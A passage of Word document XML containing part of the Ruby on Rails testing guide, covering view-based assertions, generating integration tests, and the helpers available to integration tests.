    </w:tbl>
    <w:p w14:paraId="355E9834" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> assertion is quite powerful. For more advanced usage, refer to its </w:t>
      </w:r>
      <w:hyperlink r:id="rId645" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0901D7CA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.6.1 Additional View-Based Assertions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C00C25" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are more assertions that are primarily used in testing views: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8"/>
        <w:gridCol w:w="5068"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="02113A04" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="309E9DEA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Assertion </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="501CF5DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="20AA7FD3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69EB624C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_select_email</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0626FC52" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows you to make assertions on the body of an e-mail. </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="683B9061" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47F697AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_select_encoded</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A25690A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows you to make assertions on encoded </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>HTML</w:t>
            </w:r>
            <w:r>
              <w:t>. It does this by un-encoding the contents of each element and then calling the block with all the un-encoded elements.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="581F1C6C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="501EBAB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>css_select(selector)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> or </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>css_select(element, selector)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45EE0ABF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Returns an array of all the elements selected by the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="a7"/>
              </w:rPr>
              <w:t>selector</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">. In the second variant it first matches the base </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="a7"/>
              </w:rPr>
              <w:t>element</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> and tries to match the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="a7"/>
              </w:rPr>
              <w:t>selector</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> expression on any of its children. If there are no matches both variants return an empty array.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C924FAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here’s an example of using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select_email</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0BF6F035" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54075DAA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assert_select_email do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39A116FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_select 'small', 'Please click the "Unsubscribe" link if you want to opt-out.'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73FB54F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1B69D389" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>5 Integration Testing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E4DDAD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Integration tests are used to test the interaction among any number of controllers. They are generally used to test important work flows within your application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78190472" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Unlike Unit and Functional tests, integration tests have to be explicitly created under the ‘test/integration’ folder within your application. Rails provides a generator to create an integration test skeleton for you.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2DDE9BE8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72CC7801" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate integration_test user_flows</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2924C277" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      exists  test/integration/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02450BB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create  test/integration/user_flows_test.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="500FF0DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Here’s what a freshly-generated integration test looks like:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6288"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="20F79495" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E986079" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06B9C40C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FA2BBC8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>UserFlowsTest &lt; ActionDispatch::IntegrationTest</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="410A9CB5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  fixtures :all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F2A964F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FD52446" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # Replace this with your real tests.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EDD6786" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "the truth"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2ED94E35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="619A0884" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D4591CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="550BDEA3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Integration tests inherit from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch::IntegrationTest</w:t>
      </w:r>
      <w:r>
        <w:t>. This makes available some additional helpers to use in your integration tests. Also you need to explicitly include the fixtures to be made available to the test.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4368EA22" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Helpers Available for Integration Tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEAE8CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In addition to the standard testing helpers, there are some additional helpers available to integration tests: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4"/>
        <w:gridCol w:w="3102"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="569DA9BC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="10F1E122" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Helper </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A5694F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="184F99B5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7985819C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>https?</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11CA4898" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Returns </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> if the session is mimicking a secure </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>HTTPS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> request.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="6BC6E0BE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40C867DB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>https!</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="634511C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows you to mimic a secure </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>HTTPS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> request.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="6C8D58F6" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47A8CBBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>host!</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="319CEF19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Allows you to set the host name to use in the next request.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="325C53C8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="059ACF21" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>redirect?</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F08DEE9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Returns </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> if the last request was a redirect.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="320D4296" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B06EFE8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
